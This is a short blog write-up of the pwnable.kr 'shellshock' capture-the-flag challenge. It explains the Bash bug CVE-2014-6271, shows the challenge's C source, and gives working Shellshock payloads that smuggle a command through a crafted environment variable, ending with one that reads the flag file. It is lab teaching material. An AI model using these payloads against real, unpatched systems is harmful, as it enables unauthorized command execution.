---
layout: post
title: Binary Exploitation&#58; Pwnable.kr/shellshock
---

## Pwnable.kr: shellshock - Write-up

This challenge is centered around ```CVE-2014-6271``` better known as ```shellshock```. The ```shellshock``` vulnerability leverages a bug that occurs when a child bash shell is spawned. Basiaclly, an environment variable can be assigned an arbitrary function, but when a child bash shell reads in the environment variables, it fails to stop reading at the end of the function and continues to execute whatever arbitrary code comes after. More information can be found [here](https://fedoramagazine.org/shellshock-how-does-it-actually-work/).

### The C file

We can see from the c file that the program simply sets some ID variables and calls a bash shell with an ```echo``` command.
```c
#include <stdio.h>
int main(){
        setresuid(getegid(), getegid(), getegid());
        setresgid(getegid(), getegid(), getegid());
        system("/home/shellshock/bash -c 'echo shock_me'");
        return 0;
}
```

From the name of the challenge, we can assume this is a ```shellshock``` vulnerability. No fancy programming is necessary to complete this challenge. We only need to craft an environment variable to be read by the binary.

### pwn

First, we use the following script to ensure that the vulnerability exists.
```
shellshock@pwnable:~$ env x='() { :;}; echo TEST' ./bash -c :
TEST
```

Great, now let's ```pwn```.
```
shellshock@pwnable:~$ env x='() { :;}; /bin/cat flag' ./shellshock
only if I knew CVE-2014-6271 ten years ago..!!
```

Et Voila!
